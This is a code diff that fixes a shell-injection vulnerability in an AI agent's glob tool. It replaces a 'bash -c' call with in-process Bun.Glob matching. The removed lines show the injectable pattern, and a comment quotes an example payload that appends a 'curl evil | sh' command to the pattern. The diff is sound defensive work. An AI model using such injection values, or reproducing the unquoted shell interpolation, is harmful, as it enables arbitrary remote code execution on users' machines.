@@ -1222,10 +1222,16 @@ async function execEdit(
 }
 
 /**
- * Find files matching a glob pattern using bash globstar (`**`).
+ * Find files matching a glob pattern, in-process via {@link Bun.Glob}.
  *
  * Output is limited to 100 entries to avoid context bloat. Patterns like
- * `**\/*.ts` (recursive) and `*.json` (single-level) both work.
+ * `**\/*.ts` (recursive globstar) and `*.json` (single-level) both work.
+ *
+ * Security: the `pattern` is model-controlled, so it is matched in-process and
+ * NEVER handed to a shell. (The previous implementation interpolated `pattern`
+ * unquoted into a `bash -c` string, which allowed arbitrary command execution,
+ * e.g. `pattern="*.ts; curl evil | sh"`.) Bun.Glob evaluates the pattern as a
+ * glob only — there is no shell to inject into.
  *
  * @param input - Tool input:
  *   - `pattern` - Glob pattern (e.g. `**\/*.ts`, `src/*.{js,ts}`)
@@ -1240,26 +1246,30 @@ async function execGlob(
   const searchPath = (input.path as string) ?? bashCwd
 
   try {
-    // Use find or fd if available, fallback to shell glob
-    const result = spawnSync(
-      "bash",
-      [
-        "-c",
-        `shopt -s globstar nullglob; cd "${searchPath}" && ls -1d ${pattern} 2>/dev/null | head -100`,
-      ],
-      {
-        cwd: searchPath,
-        timeout: 10_000,
-        encoding: "utf-8",
-      },
-    )
+    // Match in-process so the model-controlled pattern is never shell-evaluated.
+    // `onlyFiles:false` keeps directories (parity with `ls -1d`); `dot:false`
+    // mirrors bash glob's default of not matching leading-dot names; entries
+    // are returned relative to `cwd`. Bun.Glob handles `**` globstar.
+    const glob = new Bun.Glob(pattern)
+    const entries: string[] = []
+    for await (const entry of glob.scan({
+      cwd: searchPath,
+      onlyFiles: false,
+      dot: false,
+    })) {
+      if (opts.signal?.aborted) return ABORTED_RESULT()
+      entries.push(entry)
+      if (entries.length >= 100) break
+    }
 
-    const output = (result.stdout ?? "").trim()
-    if (!output) {
+    if (entries.length === 0) {
       return { content: "No files matched the pattern." }
     }
+    // Sort for a stable, `ls`-like ordering of the relative paths.
+    entries.sort()
+    const output = entries.join("\n")
     const totalBytes = Buffer.byteLength(output, "utf8")
-    const totalLines = output.split("\n").length
+    const totalLines = entries.length
     return { content: output, _truncCtx: { totalBytes, totalLines } }
   } catch (e) {
     return {
